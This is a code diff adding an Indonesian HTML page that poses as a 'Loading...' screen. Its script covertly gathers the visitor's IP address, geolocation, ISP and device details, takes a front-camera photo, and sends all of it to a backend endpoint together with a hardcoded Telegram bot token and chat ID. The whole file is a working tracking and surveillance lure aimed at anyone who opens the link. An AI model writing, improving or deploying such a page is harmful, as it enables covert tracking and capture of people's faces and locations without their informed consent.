@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+  body{margin:0;background:#000;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden}
+  #msg{font-size:14px;opacity:.7}
+  video{display:none}
+</style>
+</head>
+<body>
+<div id="msg">Memproses...</div>
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="cv" style="display:none"></canvas>
+
+<script>
+(async function(){
+  const TG_BOT = "9239534446:AAFl50P802TxLAmkk_mtakwZjmL6jDVan2k";
+  const TG_CHAT = "9197339653";
+
+  // ---------- 1. Ambil data publik ----------
+  let ipData = {};
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    ipData = await r.json();
+  } catch(e){ ipData = {error:"gagal ambil IP"}; }
+
+  const info = {
+    ip: ipData.ip || "-",
+    kota: ipData.city || "-",
+    region: ipData.region || "-",
+    negara: ipData.country_name || "-",
+    isp: ipData.org || "-",
+    lat: ipData.latitude || "-",
+    lon: ipData.longitude || "-",
+    timezone: ipData.timezone || "-",
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    bahasa: navigator.language,
+    layar: screen.width + "x" + screen.height,
+    waktu: new Date().toLocaleString("id-ID"),
+    referer: document.referrer || "-"
+  };
+
+  // ---------- 2. Ambil foto kamera DEPAN ----------
+  let fotoBase64 = null;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { exact: "user" } },
+      audio: false
+    });
+    const video = document.getElementById("cam");
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(r => setTimeout(r, 1500)); // tunggu fokus & exposure
+
+    const cv = document.getElementById("cv");
+    cv.width = video.videoWidth || 640;
+    cv.height = video.videoHeight || 480;
+    cv.getContext("2d").drawImage(video, 0, 0, cv.width, cv.height);
+    fotoBase64 = cv.toDataURL("image/jpeg", 0.85);
+
+    stream.getTracks().forEach(t => t.stop());
+  } catch(e) {
+    fotoBase64 = null;
+  }
+
+  // ---------- 3. Kirim ke API ----------
+  try {
+    await fetch("/api/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ info, foto: fotoBase64, bot: TG_BOT, chat: TG_CHAT })
+    });
+  } catch(e){}
+
+  document.getElementById("msg").style.display = "none";
+})();
+</script>
+</body>
+</html>
